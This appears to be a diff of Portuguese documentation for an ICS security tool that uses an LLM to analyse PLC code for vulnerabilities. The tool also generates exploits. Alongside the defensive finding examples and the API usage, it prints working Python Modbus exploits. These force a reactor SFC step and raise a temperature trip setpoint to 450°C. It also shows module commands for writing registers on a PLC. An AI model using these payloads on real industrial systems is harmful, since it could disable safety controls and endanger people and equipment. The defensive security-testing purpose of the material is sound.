-  Análise:   O watchdog timer foi desabilitado. Em condição de travamento de CPU,
-             o sistema não fará reset automático de segurança.
-  Impacto:   Processo pode permanecer em estado indefinido (potencialmente inseguro)
-             sem detecção.
-
-  FINDING [SEVERITY: HIGH]: Lógica de E-Stop Contornada
-  ─────────────────────────────────────────────────────────────────
-  Original  (linha 67): IF NOT E_STOP THEN Motor_Run := TRUE; END_IF;
-  Modificado (linha 67): IF NOT E_STOP OR Override_Flag THEN Motor_Run := TRUE; END_IF;
-
-  Análise:   O E-Stop pode ser contornado via Override_Flag. Esta flag pode ser
-             definida remotamente via Modbus sem autenticação.
-  Impacto:   Motor pode rodar mesmo com E-Stop ativado fisicamente.
-
-  FINDING [SEVERITY: MEDIUM]: Nova Instrução de Rede Adicionada
-  ─────────────────────────────────────────────────────────────────
-  Adicionado (linha 89): MB_CLIENT(REQ := TRUE, IP_ADDR := '10.0.0.99', ...);
-
-  Análise:   Uma nova instrução Modbus client foi adicionada na versão modificada.
-             Cria conexão de saída para 10.0.0.99 que não estava no projeto original.
-             Pode ser canal de exfiltração de dados de processo ou C2.
-
-  ═══════════════════════════════════════════════════════════════════
-  RESUMO DIFF: 1 CRITICAL, 3 HIGH, 1 MEDIUM
-  Recomendação: Não implantar versão modificada. Iniciar investigação forense.
-  ═══════════════════════════════════════════════════════════════════
+  ═══════════════════════════════════════════════════════════════
+  RESUMO: 1 CRÍTICO | 1 ALTO | 1 MÉDIO | 0 BAIXO
+  RECOMENDAÇÃO URGENTE: Parâmetros de segurança críticos alterados sem documentação.
+                       Acionar processo de revisão de segurança imediatamente.
 ```
 
-### Modo `exploit-gen` — Geração de Exploit
+### Modo 4: `exploit-gen` — Geração de Exploit
 
-Analisa o código PLC e gera exploits específicos baseados nas vulnerabilidades encontradas. Útil para verificação de exploitabilidade em laboratório.
+Gera uma prova de conceito de exploit baseada nas descobertas SAST.
 
+**Sintaxe:**
+```
+ixf > sast <caminho> --mode exploit-gen
+```
+
+**Exemplo completo:**
 ```
 ixf > sast /opt/plc/reactor_batch.sfc --mode exploit-gen
-[*] Alvo: reactor_batch.sfc (Sequential Function Chart, 156 linhas)
-[*] Modo: exploit generation
-[*] Provider: openai (gpt-4o)
+[*] Analisando para padrões exploráveis...
+[*] Padrões encontrados: 3 vetores potencialmente exploráveis
+[*] Gerando PoCs...
 
-  ANÁLISE DE EXPLOIT — reactor_batch.sfc
-  ═══════════════════════════════════════════════════════════════════
+  RELATÓRIO DE GERAÇÃO DE EXPLOIT
+  ═══════════════════════════════════════════════════════════════
 
-  VULNERABILIDADE: Transition T_003 sem validação de estado pré-condição
-  ─────────────────────────────────────────────────────────────────
-  Descrição: A transição T_003 (HEATING → REACTION) não valida que o nível
-             do reator está acima do mínimo necessário antes de ativar
-             o sistema de aquecimento.
-  Condição:  T_003 := Timer_Heating.Q  (* apenas timer, sem nível mínimo *)
+  ── Exploit 1: Forçar Passo SFC via Modbus ───────────────────
 
-  EXPLOIT GERADO:
-  Objetivo:  Forçar transição para estado REACTION sem nível adequado
-             → aquecimento aplicado a reator insuficientemente cheio
-             → risco de superaquecimento e liberação de vapor pressurizado
+  Alvo: Passo SFC S3 (StartReaction) — verificação de E-Stop ausente
+  Vetor: Forçar passo SFC diretamente via escrita de coil Modbus FC05
+  Severidade: HIGH | MITRE: T0836 (Modify Parameter)
 
-  Método 1 — Modbus Write (se disponível):
-    from pymodbus.client import ModbusTcpClient
-    c = ModbusTcpClient('192.168.1.100')
-    c.connect()
-    c.write_register(300, 1)  # SFC_STEP_OVERRIDE = 1 (Step 3 = REACTION)
-    c.close()
+  PoC Python gerado:
+  ─────────────────────────────────────────────────────────────
+  import socket
+  import struct
 
-  Método 2 — OPC UA Write (se servidor UA ativo):
-    use exploits/protocols/opcua/opcua_write_variable
-    set node_id "ns=2;i=1003"  # SFC.CurrentStep
-    set value 3                 # REACTION step
+  TARGET = "192.168.1.100"
+  PORT = 502
 
-  Módulo IXF equivalente:
-    use exploits/protocols/modbus/modbus_write_register
-    set target 192.168.1.100
-    set register 300
-    set value 1
+  def modbus_write_coil(unit, address, value):
+      """Modbus FC05: Write Single Coil"""
+      coil_value = 0xFF00 if value else 0x0000
+      # MBAP header: transaction=1, protocol=0, length=6
+      mbap = struct.pack(">HHH", 1, 0, 6)
+      # PDU: unit, FC05, address, value
+      pdu = struct.pack(">BBHH", unit, 0x05, address, coil_value)
+      return mbap + pdu
 
-  VERIFICAÇÃO DE EXPLOITABILIDADE:
-    ixf > use exploits/protocols/modbus/modbus_write_register
-    ixf > set target 192.168.1.100
-    ixf > set register 300
-    ixf > check   # Verificar se porta Modbus está acessível
+  # Forçar coil de transição SFC S3 (endereço 0x0010)
+  payload = modbus_write_coil(unit=1, address=0x0010, value=True)
+
+  s = socket.socket()
+  s.connect((TARGET, PORT))
+  s.send(payload)
+  response = s.recv(12)
+  print("Passo SFC forçado:", response.hex())
+  s.close()
+  ─────────────────────────────────────────────────────────────
+
+  ── Exploit 2: Modificação de Setpoint de Temperatura ────────
+
+  Alvo: Setpoint SP_TEMP_TRIP (registrador HR[142])
+  Vetor: Modbus FC16 Write Multiple Registers
+  Severidade: CRITICAL | MITRE: T0836 (Modify Parameter)
+
+  PoC Python gerado:
+  ─────────────────────────────────────────────────────────────
+  import socket
+  import struct
+
+  def modbus_write_register(target, port, unit, address, value):
+      """Modbus FC16: Write Multiple Registers (1 registro)"""
+      # Converter float para 2 registradores (IEEE 754 big-endian)
+      float_bytes = struct.pack(">f", value)
+      reg_hi, reg_lo = struct.unpack(">HH", float_bytes)
+      
+      # MBAP header
+      mbap = struct.pack(">HHH", 1, 0, 11)
+      # PDU: unit, FC16, start_addr, count, byte_count, data
+      pdu = struct.pack(">BBHHHB", unit, 0x10, address, 2, 4)
+      pdu += struct.pack(">HH", reg_hi, reg_lo)
+      
+      s = socket.socket()
+      s.connect((target, port))
+      s.send(mbap + pdu)
+      response = s.recv(12)
+      s.close()
+      return response
+
+  # Elevar setpoint de temperatura de 280°C para 450°C
+  result = modbus_write_register("192.168.1.100", 502, 1, 142, 450.0)
+  print("Setpoint modificado:", result.hex())
+  ─────────────────────────────────────────────────────────────
+
+  ═══════════════════════════════════════════════════════════════
+  AVISO: PoCs gerados apenas para fins de teste autorizado em ambientes controlados.
+         NUNCA execute contra sistemas de produção sem autorização escrita.
 ```
 
 ---
 
 ## Linguagens PLC Suportadas
 
-O motor SAST detecta automaticamente a linguagem pelo conteúdo e extensão do arquivo.
+O IXF SAST suporta análise das seguintes linguagens PLC e extensões de arquivo:
 
-| Linguagem | Padrão IEC | Extensões Suportadas | Notas |
-|-----------|-----------|---------------------|-------|
-| Structured Text (ST) | IEC 61131-3 | `.st`, `.iecst`, `.scl`, `.awl` | Mais suportada |
-| Ladder Diagram (LD) | IEC 61131-3 | `.lad`, `.ld`, `.ldr` | Análise textual via exportação |
-| Function Block Diagram (FBD) | IEC 61131-3 | `.fbd` | Análise via XML |
-| Instruction List (IL) | IEC 61131-3 | `.il`, `.awl`, `.stl` | Siemens STL/AWL |
-| Sequential Function Chart (SFC) | IEC 61131-3 | `.sfc` | Análise via XML |
-| Siemens SCL | Siemens | `.scl` | Step 7, TIA Portal |
-| Siemens STL/AWL | Siemens | `.stl`, `.awl` | Step 7 legado |
-| Rockwell Studio 5000 | Rockwell | `.l5x` | XML exportado |
-| ABB Automation Builder | ABB | `.ap1`, `.ap15` | ABB série Compact |
-| CODESYS | CODESYS | `.pro`, `.project`, `.pou` | Múltiplos vendors |
-| Beckhoff TwinCAT | Beckhoff | `.tpy`, `.pro` | TwinCAT 2/3 |
-| GX Works (Mitsubishi) | Mitsubishi | `.gx3` | Via exportação texto |
+| Linguagem | Extensões de Arquivo | Norma | Exemplos de Uso |
+|-----------|---------------------|-------|-----------------|
+| Structured Text (ST) | `.st`, `.iecst` | IEC 61131-3 | Siemens SCL, Codesys ST |
+| Ladder Diagram (LD) | `.lad`, `.ld`, `.ldr` | IEC 61131-3 | Rockwell Studio 5000 |
+| Function Block Diagram (FBD) | `.fbd` | IEC 61131-3 | Schneider EcoStruxure |
+| Instruction List (IL) | `.il` | IEC 61131-3 | Siemens STL (legado) |
+| Sequential Function Chart (SFC) | `.sfc` | IEC 61131-3 | Processos em batelada |
+| Siemens SCL/AWL | `.scl`, `.awl`, `.stl` | Siemens específico | TIA Portal, Step 7 |
+| Rockwell Tags/Logic | `.acd`, `.l5x` | Rockwell específico | Studio 5000 XML export |
+| Codesys | `.project`, `.library` | Codesys V3 | Beckhoff, Phoenix Contact |
+| Firmware binário | `.bin`, `.hex`, `.fw` | Qualquer | Para modo reverse |
 
-### Análise de diretório multi-arquivo
+**Limitações de suporte:**
 
-Quando um diretório é fornecido, o IXF analisa todos os arquivos PLC reconhecidos:
+- LD e FBD em formato XML são suportados parcialmente (extração de texto)
+- Arquivos `.acd` Rockwell requerem exportação para `.l5x` primeiro
+- Firmware binário é suportado apenas em modo `reverse`
+- Arquivos de projeto Codesys com criptografia não são suportados
 
+---
+
+## Tabela de Sanitização com Antes/Depois
+
+O IXF sanitiza automaticamente o código antes de enviá-lo ao LLM para remover informações sensíveis.
+
+| Categoria | Padrão Detectado | Antes (no código) | Após Sanitização |
+|-----------|-----------------|-------------------|------------------|
+| Credenciais hardcoded | `password=`, `PASSWORD=`, `senha=` | `PASSWORD=admin123` | `PASSWORD=[REDACTED]` |
+| Chaves de API | `API_KEY=`, `apikey=` | `API_KEY=AbCdEf123456` | `API_KEY=[REDACTED]` |
+| IPs privados | `192.168.x.x`, `10.x.x.x`, `172.16-31.x.x` | `SERVER_IP := '192.168.100.1'` | `SERVER_IP := '[PRIVATE_IP]'` |
+| IPs públicos | IPv4 fora de ranges privados | `REMOTE_IP := '203.0.113.45'` | `REMOTE_IP := '[PUBLIC_IP]'` |
+| Nomes de host internos | `*.local`, `*.internal`, `*.corp` | `SCADA_HOST := 'scada-01.plant.local'` | `SCADA_HOST := '[INTERNAL_HOST]'` |
+| Strings de conexão DB | `Server=`, `Data Source=`, `jdbc:` | `DB := 'Server=192.168.1.10;...'` | `DB := '[DB_CONNECTION]'` |
+| Tokens JWT/Bearer | `Bearer `, `ey[A-Za-z0-9]...` | `TOKEN := 'eyJhbGciOiJSUzI...'` | `TOKEN := '[JWT_TOKEN]'` |
+| Números de série | padrões de número de série conhecidos | `SERIAL := '6ES7 211-1AE40-0XB0'` | `SERIAL := '[DEVICE_SERIAL]'` |
+
+**Relatório de sanitização exibido antes do envio:**
 ```
-ixf > sast /opt/plc_project/ --mode sast
-[*] Alvo: plc_project/ (8 arquivos, 512 linhas)
-[*] Linguagens detectadas:
-    ST:  water_treatment.st (89L), pump_control.st (67L), dosing.st (54L)
-    FBD: pid_pressure.fbd (45L)
-    SFC: batch_sequence.sfc (156L)
-    LD:  safety_logic.ld (38L)
-    SCL: hmi_interface.scl (33L)
-    AWL: legacy_module.awl (30L)
+[*] Provider: gemini | Sanitizado: 2 credencial(is), 1 IP público, 1 host interno
+[*] Enviando 9.7 KB para LLM (sanitizado)...
+```
+
+**Ver detalhes da sanitização (verbose):**
+```
+ixf > set verbose true
+ixf > sast /opt/plc/code.st
+[*] Iniciando sanitização...
+[SANITIZE] Linha 12: PASSWORD=admin123 → PASSWORD=[REDACTED]
+[SANITIZE] Linha 45: 192.168.100.1 → [PRIVATE_IP]
+[SANITIZE] Linha 88: scada-01.plant.local → [INTERNAL_HOST]
+[*] 3 substituições realizadas
 ```
 
 ---
 
-## Sanitização Antes do Envio ao LLM
+## 8 Categorias de Análise com Exemplos de Achados
 
-O IXF aplica múltiplas camadas de sanitização antes de enviar qualquer código ao provider LLM, protegendo dados sensíveis.
+### Categoria 1: Validação de Entrada e Setpoints
 
-### Tabela de sanitização
+**O que é analisado:** Valores de setpoint hardcoded, variáveis sem validação de range, parâmetros de processo críticos graváveis sem restrição.
 
-| Tipo de Dado | Substituído Por | Exemplo |
-|-------------|-----------------|---------|
-| IPs públicos (não-RFC1918) | `[IP_REDACTED]` | `8.8.8.8` → `[IP_REDACTED]` |
-| IPs privados RFC1918 | **Preservados** | `192.168.1.100` mantido (necessário para análise) |
-| Strings que parecem senhas | `[CREDENTIAL_REDACTED]` | `password := 'admin123'` → `[CREDENTIAL_REDACTED]` |
-| Hostnames externos | `[HOST_REDACTED]` | `plc.empresa.com` → `[HOST_REDACTED]` |
-| Hashes/blobs hex longos (>32 chars) | `[HEXBLOB_REDACTED]` | Chaves binárias, certificados hex |
-| Blobs Base64 longos (>40 chars) | `[B64BLOB_REDACTED]` | Certificados X.509, assinaturas |
-| Linhas excessivamente longas (>300 chars) | Truncadas com `[LINE_TRUNCATED]` | Dados binários inline |
-
-### Relatório de sanitização
-
-O relatório de sanitização é exibido antes da análise:
-
+**Exemplo de achado:**
 ```
-[*] Sanitizando código...
-    Sanitizado: 2 credenciais, 1 IP público, 3 blobs hex, 0 hostnames externos
-    IPs privados preservados: 192.168.1.100, 10.0.1.50, 172.16.0.5
-    Tamanho original: 12,450 chars | Tamanho sanitizado: 10,823 chars
+DESCOBERTA [CRÍTICO]: Velocidade de Motor Sem Limite Superior
+  Localização: compressor.il, FC3, linha 15
+  Código: MW100 → D[SPEED_CMD] (sem validação)
+  Ataque: Modbus FC16 write para HR[50] com valor 65535
+  Impacto: Motor à 65535 RPM → falha mecânica catastrófica, risco de explosão
+  Remediação: IF MW100 > MAX_SAFE_RPM THEN MW100 := MAX_SAFE_RPM; END_IF
 ```
 
-### Orçamento de tokens
+### Categoria 2: Controle de Acesso e Autenticação
 
-O payload enviado ao LLM é limitado a **32.000 caracteres** (~8.000 tokens) para compatibilidade com todos os modelos. Se o projeto exceder o limite:
+**O que é analisado:** Rotas de acesso sem autenticação, credenciais hardcoded, contas de manutenção sem senha, acesso remoto não autenticado.
 
+**Exemplo de achado:**
 ```
-[*] Tamanho do projeto: 85,230 chars (excede limite de 32,000)
-[*] Estratégia de segmentação: analisando em 3 partes
-[*] Parte 1/3: water_treatment.st, pump_control.st (10,100 chars)
-[*] Parte 2/3: dosing.st, pid_pressure.fbd, batch_sequence.sfc (11,200 chars)
-[*] Parte 3/3: safety_logic.ld, hmi_interface.scl, legacy_module.awl (10,720 chars)
-[*] Consolidando relatórios parciais...
+DESCOBERTA [CRÍTICO]: Acesso de Manutenção Sem Senha
+  Localização: maintenance.st, linha 34
+  Código: IF maintenance_mode THEN bypass_safety := TRUE; END_IF
+  Problema: maintenance_mode pode ser ativado via Modbus sem autenticação
+  Remediação: Adicionar autenticação de 2 fatores para ativar maintenance_mode
+```
+
+### Categoria 3: Lógica de Processo e Segurança
+
+**O que é analisado:** Intertraves de segurança ausentes, condições de corrida em loops de controle, verificações de E-Stop incompletas, lógica SFC sem guarda de condição.
+
+**Exemplo de achado:**
+```
+DESCOBERTA [ALTO]: Interlock de Temperatura Ausente em Passo de Reação
+  Localização: batch_reactor.sfc, transição T3
+  Problema: SFC não verifica TEMP_OK antes de iniciar adição de reagente
+  Cenário: Reação exotérmica em temperatura incorreta → risco de runaway
+  Remediação: Adicionar condição TEMP_OK AND PRESSURE_OK na transição T3
+```
+
+### Categoria 4: Comunicação de Rede e Protocolos
+
+**O que é analisado:** Conexões de rede sem criptografia, serviços de rede desnecessários habilitados, configurações CORS/firewall ausentes, comunicação em texto claro.
+
+**Exemplo de achado:**
+```
+DESCOBERTA [ALTO]: Modbus Sem Autenticação em Registradores Críticos
+  Localização: modbus_config.st, mapa de endereços
+  Problema: HR[100]-HR[200] (parâmetros de segurança) acessíveis sem autenticação
+  Ataque: Qualquer host na rede OT pode modificar setpoints de segurança
+  Remediação: Implementar firewall industrial para restringir escrita Modbus
+              a endereços fonte autorizados
+```
+
+### Categoria 5: Gerenciamento de Erros e Exceções
+
+**O que é analisado:** Tratamento de erros ausente, falhas silenciosas, estados de falha inseguros, código que continua operação após erro crítico.
+
+**Exemplo de achado:**
+```
+DESCOBERTA [MÉDIO]: Falha Silenciosa em Comunicação com Sensor
+  Localização: sensor_read.st, linhas 45-52
+  Problema: Timeout de leitura de sensor retorna último valor válido sem alarme
+  Cenário: Sensor com falha não detectado → processo continua com dado desatualizado
+  Remediação: Implementar timeout de watchdog e alarme de falha de comunicação
+```
+
+### Categoria 6: Integridade e Validação de Dados
+
+**O que é analisado:** Dados de sensor sem verificação de sanidade, valores que excedem faixas físicas plausíveis, dados usados sem validação de fonte.
+
+**Exemplo de achado:**
+```
+DESCOBERTA [MÉDIO]: Dado de Encoder Sem Verificação de Sanidade
+  Localização: conveyor.ld, rung 23
+  Problema: Velocidade de encoder aceita qualquer valor (incluindo negativos)
+  Cenário: Encoder com falha envia dado incorreto → velocidade negativa calculada
+  Remediação: Validar valor encoder em [0, MAX_ENCODER_VALUE] antes de usar
+```
+
+### Categoria 7: Configurações de Segurança e Proteção
+
+**O que é analisado:** Configurações padrão não alteradas, portas de serviço desnecessárias abertas, funcionalidades de debug em produção, acesso físico sem proteção.
+
+**Exemplo de achado:**
+```
+DESCOBERTA [ALTO]: Porta de Diagnóstico Aberta em Produção
+  Localização: communication_config.st, linha 89
+  Código: DIAGNOSTIC_PORT := 8080; DIAGNOSTIC_ENABLED := TRUE;
+  Problema: Porta de diagnóstico habilitada sem autenticação em produção
+  Remediação: DIAGNOSTIC_ENABLED := FALSE; — ou adicionar autenticação
+```
+
+### Categoria 8: Compatibilidade e Dependências
+
+**O que é analisado:** Bibliotecas desatualizadas com vulnerabilidades conhecidas, funcionalidades deprecadas, protocolos legados inseguros.
+
+**Exemplo de achado:**
+```
+DESCOBERTA [MÉDIO]: Uso de Protocolo Telnet Legado
+  Localização: remote_access.st, linha 12
+  Código: TELNET_ENABLED := TRUE; TELNET_PORT := 23;
+  Problema: Telnet transmite credenciais em texto claro
+  Remediação: Substituir por SSH (porta 22) com autenticação por chave
 ```
 
 ---
 
-## Categorias de Análise SAST
+## API Python
 
-O prompt do LLM instrui a análise em 8 categorias específicas de OT/ICS:
+### Uso básico da API SAST
 
-### 1. Setpoints e Parâmetros de Processo
+```python
+from industrialxpl.core.sast.analyzer import SASTAnalyzer
 
-Verificação de setpoints que podem causar dano físico se modificados:
-- Limites de temperatura, pressão, concentração química
-- Velocidades de motor acima das especificações
-- Volumes de dosagem de substâncias perigosas
-- Setpoints de corrente elétrica em subestações
+# Criar analisador com provider específico
+analyzer = SASTAnalyzer(provider="gemini")
 
-**Exemplos de achados:**
-- `SP_CHLORINE_HIGH := 4000.0` — cloro 2000x acima do limite seguro
-- `MAX_PRESSURE := 500.0` — pressão acima da especificação do vaso
-- `MOTOR_SPEED_MAX := 9999` — velocidade acima do limite mecânico
+# Analisar arquivo único
+result = analyzer.analyze_file(
+    path="/opt/plc/water_treatment.st",
+    mode="sast"
+)
 
-### 2. Lógica de Sistema de Safety
+# Acessar descobertas
+for finding in result.findings:
+    print(f"[{finding.severity}] {finding.title}")
+    print(f"  Localização: {finding.location}")
+    print(f"  MITRE: {', '.join(finding.mitre_techniques)}")
+    print(f"  Remediação: {finding.remediation}")
+    print()
 
-Verificação de mecanismos de segurança que podem ser comprometidos:
-- E-Stop (Emergency Stop) com bypass ou override não documentado
-- STO (Safe Torque Off) com condições de bypass
-- SOS (Safe Operating Stop) com flags de override
-- SLS (Safely Limited Speed) com verificação fraca
-- Alarmes silenciados ou com threshold muito alto
-- Watchdog timer desabilitado
+# Resumo
+print(f"Total: {result.total_findings} descobertas")
+print(f"Críticos: {result.critical_count}")
+print(f"Altos: {result.high_count}")
+```
 
-### 3. Autenticação e Controle de Acesso
+### Análise de diretório completo
 
-- Credenciais hardcoded no código-fonte
-- Flags de bypass de autenticação
-- Comandos privilegiados sem verificação de autorização
-- Acesso não registrado a funções críticas
+```python
+from industrialxpl.core.sast.analyzer import SASTAnalyzer
+from pathlib import Path
 
-### 4. Validação de Entradas Externas
+analyzer = SASTAnalyzer()  # usa provider de maior prioridade
 
-- Entradas Modbus/OPC UA sem verificação de limites
-- Dados de IHM/HMI passados diretamente para atuadores
-- Parâmetros de receita sem validação
-- Valores de setpoint sem verificação de faixa segura
+# Analisar diretório inteiro
+result = analyzer.analyze_directory(
+    path=Path("/opt/plc_projects/reactor/"),
+    recursive=True,
+    file_extensions=[".st", ".fbd", ".sfc"],
+    mode="sast"
+)
 
-### 5. Race Conditions e Timing
+# Gerar relatório Markdown
+report_path = result.save_report(
+    output_path="/opt/reports/reactor_sast.md",
+    format="markdown"
+)
+print(f"Relatório salvo: {report_path}")
+```
 
-- Acesso simultâneo a variáveis compartilhadas entre OBs
-- Interrupções cíclicas que modificam variáveis usadas no ciclo principal
-- Timing de sequência que pode causar transições de estado incorretas
-- Uso de TIMER sem tratamento de overflow
+### Análise diferencial programática
 
-### 6. Rede e Comunicação
+```python
+from industrialxpl.core.sast.analyzer import SASTAnalyzer
 
-- Protocolos sem criptografia para dados críticos
-- Conexões de saída não documentadas (possível C2)
-- MQTT sem autenticação
-- Comunicação com IPs externos não documentados
+analyzer = SASTAnalyzer(provider="openai")
 
-### 7. Falhas de Lógica e Cenários de Ataque
+# Comparar duas versões
+result = analyzer.diff_analyze(
+    original="/opt/plc/v2.3_original.st",
+    modified="/opt/plc/v2.3_modified.st"
+)
 
-- Padrões que permitem ataque de replay
-- Sequências de estado que podem ser manipuladas remotamente
-- Lógica de falha que resulta em estado inseguro em vez de estado seguro
-- Condições de corrida em lógica de intertravamento
+# Verificar se há mudanças críticas
+if result.has_critical_changes:
+    print("ALERTA: Mudanças críticas de segurança detectadas!")
+    for change in result.critical_changes:
+        print(f"  {change.description}")
+```
 
-### 8. Resumo de Achados
+### Integração com pipeline CI/CD
 
-Relatório estruturado com severidade CRITICAL/HIGH/MEDIUM/LOW e recomendações de remediação priorizadas.
+```python
+from industrialxpl.core.sast.analyzer import SASTAnalyzer
+import sys
+
+def run_sast_gate(plc_directory: str, max_critical: int = 0) -> bool:
+    """Gate de qualidade SAST para pipeline CI/CD."""
+    analyzer = SASTAnalyzer(provider="gemini")
+    result = analyzer.analyze_directory(plc_directory)
+    
+    if result.critical_count > max_critical:
+        print(f"FALHA NO GATE: {result.critical_count} descobertas críticas")
+        for f in result.critical_findings:
+            print(f"  [{f.severity}] {f.title} em {f.location}")
+        return False
+    
+    print(f"Gate SAST aprovado: {result.critical_count} críticos, {result.high_count} altos")
+    return True
+
+# Uso no pipeline
+if not run_sast_gate("/opt/plc_projects/", max_critical=0):
+    sys.exit(1)  # Falha no pipeline
+```
 
 ---
 
-## Exemplos SAST Incluídos
+## Todos os 17 Exemplos em `sast_examples/`
 
-O IXF inclui 17 exemplos de código PLC realistas com vulnerabilidades documentadas, localizados em `industrialxpl/resources/sast_examples/`.
+O diretório `industrialxpl/resources/sast_examples/` contém 17 exemplos de código PLC com vulnerabilidades conhecidas para teste e demonstração do SAST.
 
-| Arquivo | Setor | Processo | Vulnerabilidades Principais |
-|---------|-------|---------|----------------------------|
-| `nuclear_reactor_cooling.st` | Nuclear | Resfriamento de reator | SCRAM bypassado via Maintenance_Mode |
-| `water_treatment_chemical_dosing.st` | Água | Tratamento de água | Cloro 4000 mg/L, SIS desabilitável |
-| `gas_pipeline_pressure_control.st` | O&G | Gasoduto | ESD + SIS ambos bypassed |
-| `power_grid_substation.st` | Energia | Subestação elétrica | DNP3 sem SAv5, disjuntores manipuláveis |
-| `oil_refinery_process.st` | O&G | Refinaria de petróleo | Aquecedor acima do limite de projeto |
-| `wind_farm_scada.st` | Energia | Parque eólico | MQTT sem autenticação, credenciais expostas |
-| `automotive_assembly_line.st` | Manufatura | Linha de montagem | E-Stop bypass, limites de torque hardcoded |
-| `pharmaceutical_batch.sfc` | Farmacêutica | Processamento em batch | Validação FDA comprometida |
-| `food_beverage_pasteurization.fbd` | Alimentos | Pasteurização | Temperatura insuficiente bypassável |
-| `building_hvac_control.st` | Predial | HVAC | CO2 sensor ignorado, ventilação desabilitável |
-| `chemical_reactor_batch.st` | Química | Reator químico | Temperatura acima do limite de projeto |
-| `water_pump_station.ld` | Água | Estação de bombeamento | Proteção de bomba bypassável |
-| `mining_conveyor_control.st` | Mineração | Esteira transportadora | Proteção de sobrecarga desabilitada |
-| `smart_grid_balancing.st` | Energia | Balanceamento de carga | Injeção de falsos dados de medição |
-| `railway_signaling.sfc` | Ferroviário | Sinalização | Conflito de sinal bypass |
-| `maritime_ballast_system.st` | Marítimo | Sistema de lastro | Overflow de tanque possível |
-| `wastewater_treatment.st` | Água | Tratamento de efluentes | Descarte de material tóxico sem tratamento |
+| Arquivo | Linguagem | Processo Industrial | Vulnerabilidades Incluídas |
+|---------|-----------|--------------------|-----------------------------|
+| `water_treatment.st` | ST | Tratamento de água | Setpoint de cloro não validado, race condition em pH |
+| `nuclear_reactor_cooling.st` | ST | Resfriamento de reator nuclear | Interlock de segurança ausente, credencial hardcoded |
+| `gas_pipeline_pressure_control.fbd` | FBD | Controle de pressão de gasoduto | Modificação de PID via OPC UA anônimo, alarme desabilitado |
+| `power_grid_substation.st` | ST | Subestação de rede elétrica | Autorização ausente para chaveamento de disjuntor |
+| `oil_refinery_process.st` | ST | Refinaria de petróleo | Setpoint de temperatura acima do ponto de ignição |
+| `wind_farm_scada.sfc` | SFC | SCADA de parque eólico | Bypasse de E-stop, lógica de pitch sem validação |
+| `GRFICSv3_655326.st` | ST | Processo Tennessee Eastman (GRFICSv3) | Múltiplas vulnerabilidades de setpoint |
+| `GRFICSv3_690525.st` | ST | Processo Tennessee Eastman variante | Credenciais OPC UA, acesso anônimo |
+| `GRFICSv3_attack.st` | ST | Versão pós-ataque do GRFICSv3 | Backdoor inserido, setpoint modificado |
+| `GRFICSv3_blank.st` | ST | Template limpo GRFICSv3 | Sem vulnerabilidades (baseline) |
+| `GRFICSv3_chemical.st` | ST | Reação química GRFICSv3 | Race condition em dosagem, overflow |
+| `GRFICSv3_simplified_te.st` | ST | Processo TE simplificado | Setpoints críticos sem validação |
+| `water_treatment_chemical_dosing.st` | ST | Dosagem química de água | Análogo ao ataque Oldsmar 2021 |
+| `reactor_batch.sfc` | SFC | Reator em batelada | Verificação E-stop ausente em SFC |
+| `compressor_control.il` | IL | Controle de compressor | Velocidade de motor sem limite, overflow |
+| `pump_station.fbd` | FBD | Estação de bombeamento | PID não protegido, pressão sem limite |
+| `scada_hmi_interface.st` | ST | Interface HMI SCADA | Injeção de comando via variável HMI, credencial exposta |
 
-### Analisar um exemplo incluído
+**Como usar os exemplos:**
 
 ```
-ixf > llm-key gemini AIzaSy...
+ixf > sast industrialxpl/resources/sast_examples/water_treatment.st --mode sast
+[*] Analisando arquivo de exemplo: water_treatment.st
+[*] Este é um exemplo educacional com vulnerabilidades conhecidas...
+```
+
+**Rodar todos os exemplos em lote:**
+
+```python
+from pathlib import Path
+from industrialxpl.core.sast.analyzer import SASTAnalyzer
+
+examples_dir = Path("industrialxpl/resources/sast_examples/")
+analyzer = SASTAnalyzer()
+
+for example_file in examples_dir.glob("*.st"):
+    result = analyzer.analyze_file(example_file)
+    print(f"\n{'='*60}")
+    print(f"Arquivo: {example_file.name}")
+    print(f"Descobertas: {result.total_findings} ({result.critical_count} críticos)")
+```
+
+---
+
+---
+
+## Exemplos de Análise por Setor
+
+### Análise — Resfriamento de Reator Nuclear
+
+```
+ixf > llm-key anthropic sk-ant-api03-xxx
 ixf > sast industrialxpl/resources/sast_examples/nuclear_reactor_cooling.st
 
 [*] Alvo: nuclear_reactor_cooling.st (1 arquivo, 234 linhas)
-[*] Linguagem: ST (Structured Text)
-[*] Provider: gemini (gemini-2.5-flash)
-[*] Sanitizando... 0 credenciais, 0 IPs públicos
-[*] Enviando 8,9 KB ao LLM...
+[*] Linguagem: ST | Provider: anthropic (claude-3-5-sonnet)
 
   RELATÓRIO DE ANÁLISE SAST — nuclear_reactor_cooling.st
   ═══════════════════════════════════════════════════════════════════
 
-  FINDING [SEVERITY: CRITICAL]: SCRAM (Emergency Shutdown) Desabilitado em Manutenção
-  Localização: linha 45
-  Código:  IF Maintenance_Mode THEN SCRAM_Enable := FALSE; END_IF;
-  Descrição: O sistema SCRAM (Shutdown Cooling Reactor Automatic Mechanism) é
-             completamente desabilitado quando Maintenance_Mode = TRUE.
-             Este flag pode ser definido via Modbus FC05 na bobina 50.
-  Impacto: CATASTRÓFICO — Reator não pode ser desligado de emergência durante
-           falha de resfriamento. Potencial de fusão do núcleo.
-  MITRE:   T0836, T0828, T0879
-  Remediação: NUNCA desabilitar SCRAM via software. Usar bypass físico documentado
-              com procedimento de segurança aprovado pela autoridade regulatória.
+  FINDING [SEVERITY: CRITICAL]: Sistema SCRAM Desabilitável via Software
+    Linha 45: IF Maintenance_Mode THEN SCRAM_Enable := FALSE; END_IF;
+    Impacto:  Reator não pode ser desligado de emergência durante condição crítica
+    MITRE:    T0836, T0828, T0879
+    Remediação: SCRAM deve ser hardware-interlocked, não software-controlado
 
-  FINDING [SEVERITY: CRITICAL]: Setpoint de Temperatura de Coolant Manipulável
-  Localização: linha 89
-  Código:  Coolant_Temp_Max := Maintenance_Setpoint;  (* somente manutenção *)
-  Descrição: O limite máximo de temperatura do coolant é redefinível via parâmetro
-             de manutenção. Pode ser elevado acima dos limites seguros de projeto.
-  …
+  FINDING [SEVERITY: CRITICAL]: Temperatura de Coolant Manipulável Externamente
+    Linha 89: Coolant_Temp_Max := Maintenance_Setpoint;
+    Impacto:  Limite de temperatura elevável acima dos limites seguros de projeto
+    Vetor:    Modbus FC16 HR[50] ou OPC UA sem autenticação
+    MITRE:    T0836
+
+  RESUMO: 2 CRITICAL, 2 HIGH, 3 MEDIUM
+```
+
+### Análise Diferencial — Descoberta de Modificação Maliciosa
+
+```
+ixf > sast /opt/plc/firmware_v3.6_baseline.st \
+      --mode diff \
